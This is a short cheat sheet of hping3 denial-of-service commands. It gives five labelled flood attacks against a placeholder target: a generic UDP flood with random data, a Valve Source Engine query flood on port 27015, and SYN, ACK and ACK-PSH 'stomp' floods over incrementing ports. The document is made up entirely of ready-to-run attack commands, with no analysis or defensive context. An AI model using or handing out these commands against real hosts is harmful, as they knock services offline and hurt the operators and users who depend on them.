# hping3 DoS

# attack_udp_generic:
hping3 --udp --tos 0 --ttl 64 --data 512 --file /dev/urandom --flood $targetip

# attack_udp_vse:
printf 'TSource Engine Query\0' > table_atk_vse; hping3 --udp --tos 0 --ttl 64 --destport 27015 --data 21 --file table_atk_vse --flood $targetip

# attack_tcp_syn:
hping3 --tos 0 --ttl 64 --dontfrag --destport ++0 --setack 0 --syn --flood $targetip

# attack_tcp_ack:
hping3 --tos 0 --ttl 64 --destport ++0 --ack --data 512 --file /dev/urandom --flood $targetip

# attack_tcp_stomp:
hping3 --tos 0 --ttl 64 --dontfrag --destport ++0 --ack --push --data 768 --file /dev/urandom --flood $targetip
